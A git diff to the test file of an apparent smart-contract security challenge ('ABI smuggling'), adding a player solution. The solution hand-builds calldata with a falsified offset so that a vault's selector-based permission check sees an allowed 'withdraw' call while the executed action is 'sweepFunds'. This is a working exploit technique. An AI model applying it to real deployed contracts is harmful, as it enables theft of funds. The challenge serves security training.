@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers");
 
 describe('[Challenge] ABI smuggling', function () {
     let deployer, player, recovery;
@@ -45,6 +46,19 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // execute function sig (4 bytes) | target (32 bytes) | size of actionData (32 bytes) | empty padding (32 bytes) | function sig withdraw (4 bytes) | length of actionData (32 bytes) | actionData (4+32+32 bytes)
+        const executeFn = await vault.interface.getFunction("execute");
+        const executeSig = await vault.interface.getSighash(executeFn); 
+        const vaultAddress = ethers.utils.hexZeroPad(vault.address, 32);
+        const actionDataOffset = ethers.utils.hexZeroPad("0x64", 32);
+        const fakePadding = ethers.utils.hexZeroPad("0x0", 32);
+        const withdrawFn = await vault.interface.getFunction("withdraw");
+        const withdrawSig = await vault.interface.getSighash(withdrawFn); 
+        const actionDataLength = ethers.utils.hexZeroPad("0x44", 32);
+        const actionDataContent = vault.interface.encodeFunctionData("sweepFunds", [ recovery.address, token.address ])
+
+        const txData = ethers.utils.hexConcat([executeSig, vaultAddress, actionDataOffset, fakePadding, withdrawSig, actionDataLength, actionDataContent]);
+        await player.sendTransaction({ to: vault.address, data: txData })
     });
 
     after(async function () {
